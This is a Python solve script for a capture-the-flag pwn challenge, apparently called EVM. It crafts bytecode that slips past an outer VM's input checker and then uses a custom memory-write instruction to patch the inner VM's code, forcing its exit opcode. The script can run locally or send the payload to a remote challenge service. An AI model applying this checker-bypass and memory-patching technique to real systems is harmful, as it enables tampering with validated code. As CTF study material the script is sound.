#!/usr/bin/env python3
# EVM - YanamiAnna
# Build a valid input that passes the outer input checker, patches the inner VM,
# and makes the inner VM execute opcode 2 (clean exit/free_all).

from __future__ import annotations

import argparse
import socket
import subprocess
from pathlib import Path
from struct import pack


def p32(x: int) -> bytes:
    return pack('<I', x & 0xffffffff)


def lui(rd: int, imm20: int) -> int:
    return ((imm20 & 0xfffff) << 12) | (rd << 7) | 0x37


def addi(rd: int, rs1: int, imm: int) -> int:
    # The VM keeps the low 12 bits; this is enough for the small immediates used here.
    return ((imm & 0xfff) << 20) | (rs1 << 15) | (0 << 12) | (rd << 7) | 0x13


def xstore(rs2: int, rs1: int, imm: int = 0, width: int = 0) -> int:
    """Custom opcode 0x2f: write reg[rs2] to physical_base + reg[rs1] + imm.

    width/funct3: 0=byte, 1=word, 2=dword, 3=qword.
    """
    return (
        (((imm >> 5) & 0x7f) << 25)
        | (rs2 << 20)
        | (rs1 << 15)
        | ((width & 7) << 12)
        | ((imm & 0x1f) << 7)
        | 0x2f
    )


def build_payload() -> bytes:
    # Inner VM bytecode begins at physical offset 0x300000.
    # It is initially checked as \x13\x00\x00\x00..., so we submit one legal byte 0x13,
    # then use the outer VM to overwrite it with opcode 2.
    code = b''.join(
        p32(ins)
        for ins in (
            lui(1, 0x300),      # x1 = 0x300000
            addi(2, 0, 2),      # x2 = 2, inner opcode: exit/free_all
            xstore(2, 1, 0, 0), # *(physical_base + 0x300000) = 2
        )
    )

    inner_len = 1
    inner_placeholder = b'\x13'  # passes blind-vm initial-byte checker

    return b''.join(
        [
            str(len(code)).encode(), b'\n',
            b'0\n',                 # outer heap page count
            code,
            str(inner_len).encode(), b'\n',
            b'0\n',                 # checked number in [0,3]
            inner_placeholder,
        ]
    )


def run_local(payload: bytes, cwd: Path) -> int:
    cmd = ['./ld-linux-x86-64.so.2', '--library-path', '.', './pwn']
    proc = subprocess.run(cmd, cwd=str(cwd), input=payload)
    return proc.returncode


def send_remote(payload: bytes, host: str, port: int) -> bytes:
    with socket.create_connection((host, port), timeout=10) as s:
        s.sendall(payload)
        s.shutdown(socket.SHUT_WR)
        chunks = []
        while True:
            data = s.recv(4096)
            if not data:
                break
            chunks.append(data)
        return b''.join(chunks)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument('--out', default='payload.bin', help='payload output path')
    parser.add_argument('--local', action='store_true', help='run against local ./pwn with bundled ld/libc')
    parser.add_argument('--remote', nargs=2, metavar=('HOST', 'PORT'), help='send payload to a remote service')
    args = parser.parse_args()

    payload = build_payload()
    out = Path(args.out)
    out.write_bytes(payload)
    print(f'[+] wrote {out} ({len(payload)} bytes)')

    cwd = Path(__file__).resolve().parent
    if args.local:
        rc = run_local(payload, cwd)
        print(f'[+] local return code: {rc}')

    if args.remote:
        host, port_s = args.remote
        data = send_remote(payload, host, int(port_s))
        print(data.decode(errors='replace'), end='')


if __name__ == '__main__':
    main()
